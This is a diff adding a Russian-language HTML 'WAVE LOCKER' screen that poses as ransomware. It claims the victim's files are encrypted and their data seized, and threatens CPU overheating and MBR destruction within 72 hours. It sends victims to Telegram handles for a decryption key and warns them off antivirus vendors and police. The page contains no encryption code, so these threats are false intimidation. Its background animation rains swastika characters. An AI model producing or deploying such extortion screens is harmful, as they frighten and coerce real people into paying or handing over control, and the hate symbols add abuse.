@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WAVE LOCKER</title>
+    <script src="https://cdn.jsdelivr.net/npm/three@0.168.0/build/three.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/three@0.168.0/examples/js/controls/OrbitControls.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap');
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            overflow: hidden;
+            background: #000;
+            color: #0f0;
+            font-family: 'Orbitron', monospace;
+            height: 100vh;
+            perspective: 1000px;
+        }
+        #matrix-bg {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 1;
+            opacity: 0.2;
+        }
+        .container {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 10;
+        }
+        .locker {
+            width: 95vw;
+            max-width: 1100px;
+            height: 85vh;
+            background: rgba(0, 15, 10, 0.95);
+            border: 2px solid #0f0;
+            border-radius: 20px;
+            box-shadow: 
+                0 0 50px #0f0,
+                inset 0 0 30px rgba(0, 255, 0, 0.3);
+            backdrop-filter: blur(10px);
+            overflow: hidden;
+            position: relative;
+            transform-style: preserve-3d;
+            animation: pulse 4s infinite alternate;
+        }
+        @keyframes pulse {
+            0% { box-shadow: 0 0 50px #0f0, inset 0 0 30px rgba(0,255,0,0.3); }
+            100% { box-shadow: 0 0 80px #0f8, inset 0 0 50px rgba(0,255,130,0.5); }
+        }
+        .header {
+            text-align: center;
+            padding: 20px;
+            font-size: 4vw;
+            font-weight: 900;
+            background: linear-gradient(90deg, #0f0, #0ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 0 20px #0f0;
+            letter-spacing: 10px;
+            animation: glitch 3s infinite;
+        }
+        @keyframes glitch {
+            0%,100% { text-shadow: 0 0 20px #0f0; }
+            20% { text-shadow: 5px 0 20px #f00, -5px 0 20px #0ff; }
+        }
+        .console {
+            height: calc(100% - 100px);
+            padding: 20px;
+            overflow-y: auto;
+            font-size: 1.1rem;
+            line-height: 1.8;
+            color: #0f0;
+        }
+        .line {
+            opacity: 0;
+            animation: typing 0.05s forwards;
+        }
+        @keyframes typing {
+            to { opacity: 1; }
+        }
+        .blink {
+            animation: blink 1s infinite;
+        }
+        @keyframes blink {
+            50% { opacity: 0; }
+        }
+        .wave-3d {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            z-index: -1;
+            pointer-events: none;
+        }
+        .tg-btn {
+            display: inline-block;
+            margin: 20px auto;
+            padding: 15px 40px;
+            background: rgba(0, 255, 0, 0.1);
+            border: 2px solid #0f0;
+            border-radius: 50px;
+            color: #0f0;
+            text-decoration: none;
+            font-size: 1.5rem;
+            font-weight: bold;
+            box-shadow: 0 0 30px #0f0;
+            transition: all 0.3s;
+        }
+        .tg-btn:hover {
+            background: #0f0;
+            color: #000;
+            transform: scale(1.1);
+            box-shadow: 0 0 60px #0f0;
+        }
+        .warning {
+            color: #f00;
+            font-weight: bold;
+            text-shadow: 0 0 10px #f00;
+        }
+    </style>
+</head>
+<body>
+
+<canvas id="matrix-bg"></canvas>
+
+<div class="container">
+    <div class="locker">
+        <div class="header">WAVE LOCKER :3</div>
+        <div class="console" id="console">
+            <div class="line">>>> [ADMIN] WAVE LOCKER Builder </div>
+            <div class="line">>>> [ADMIN] Вы были замечены за использованием Сторонних ПО</div>
+            <div class="line">>>> [ADMIN] Просто так снять Локер не выйдет, так как стоит лучший алгоритм шифровки данных</div>
+            <div class="line">>>> Все файлы зашифрованы алгоритмом WAVE-XDWL</div>
+            <div class="line">>>> Просьба соблюдать правила ибо может быть хуже</div>
+            <div class="line">>>> Личные данные, фото, документы, пароли — всё под нашим контролем</div>
+            <div class="line">>>> Попытки переустановки ОС, сброса или отключения питания — приведут к необратимому процессу нагревания вашего процессора и сильной нагрузки на MBR</div>
+            <div class="line">>>> У вас есть 72 часа до полного уничтожения MBR</div>
+            <div class="line">>>> Для получения ключа расшифровки свяжитесь с оператором:</div>
+            <div class="line">>>> <a href="https://t.me/Wave_Locker_bot" target="_blank" class="tg-btn">@Wave_Locker_bot</a></div>
+            <div class="line">>>> Альтернативный контакт: @NightWave_Coder</div>
+            <div class="line warning">>>> Любые действия через антивирусы, форумы или полицию — мгновенная активация Wave Protect</div>
+            <div class="line">>>> Мы следим за каждым вашим действием в реальном времени</div>
+            <div class="line">>>> WAVE LOCKER — это Добровольная Беседа по получению Средств</div>
+            <div class="line warning">>>> ROOT: ВАЖНОЕ ПРАВИЛО После Розбана ты ДОЛЖЕН передать инфу о локере в Тик ток или ютуб, без разницы</div>
+            <div class="line">>>> <span class="blink">█</span></div>
+        </div>
+    </div>
+</div>
+
+<div class="wave-3d" id="wave3d"></div>
+
+<script>
+// Matrix дождь
+const canvas = document.getElementById('matrix-bg');
+const ctx = canvas.getContext('2d');
+canvas.width = window.innerWidth;
+canvas.height = window.innerHeight;
+
+const matrix = "卐 卍";
+const fontSize = 14;
+const columns = canvas.width / fontSize;
+const drops = Array(Math.floor(columns)).fill(1);
+
+function drawMatrix() {
+    ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+    ctx.fillStyle = '#0f0';
+    ctx.font = fontSize + 'px monospace';
+
+    for (let i = 0; i < drops.length; i++) {
+        const text = matrix.charAt(Math.floor(Math.random() * matrix.length));
+        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+
+        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+            drops[i] = 0;
+        }
+        drops[i]++;
+    }
+}
+setInterval(drawMatrix, 35);
+
+// Печатание текста по строкам
+const lines = document.querySelectorAll('.line');
+lines.forEach((line, index) => {
+    line.style.animationDelay = (index * 0.3) + 's';
+});
+
+// 3D волна
+let scene, camera, renderer, geometry, material, mesh;
+
+function init3D() {
+    scene = new THREE.Scene();
+    camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
+    renderer = new THREE.WebGLRenderer({ alpha: true, antialias: true });
+    renderer.setSize(window.innerWidth, window.innerHeight);
+    document.getElementById('wave3d').appendChild(renderer.domElement);
+
+    geometry = new THREE.PlaneGeometry(20, 20, 128, 128);
+    material = new THREE.MeshBasicMaterial({
+        color: 0x00ff88,
+        wireframe: true,
+        transparent: true,
+        opacity: 0.2,
+        side: THREE.DoubleSide
+    });
+    mesh = new THREE.Mesh(geometry, material);
+    scene.add(mesh);
+
+    camera.position.z = 15;
+    camera.position.y = 5;
+    camera.lookAt(0, 0, 0);
+}
+
+let time = 0;
+function animateWave() {
+    requestAnimationFrame(animateWave);
+    time += 0.01;
+
+    const verts = mesh.geometry.attributes.position.array;
+    for (let i = 0; i < verts.length; i += 3) {
+        const x = verts[i];
+        const y = verts[i + 1];
+        verts[i + 2] = Math.sin(x + time) * 0.5 + Math.cos(y + time) * 0.5;
+    }
+    mesh.geometry.attributes.position.needsUpdate = true;
+    mesh.rotation.y += 0.005;
+    mesh.rotation.x = Math.sin(time * 0.5) * 0.1;
+
+    renderer.render(scene, camera);
+}
+
+init3D();
+animateWave();
+
+// Адаптив
+window.addEventListener('resize', () => {
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    renderer.setSize(window.innerWidth, window.innerHeight);
+    camera.aspect = window.innerWidth / window.innerHeight;
+    camera.updateProjectionMatrix();
+});
+</script>
+
+</body>
+</html>
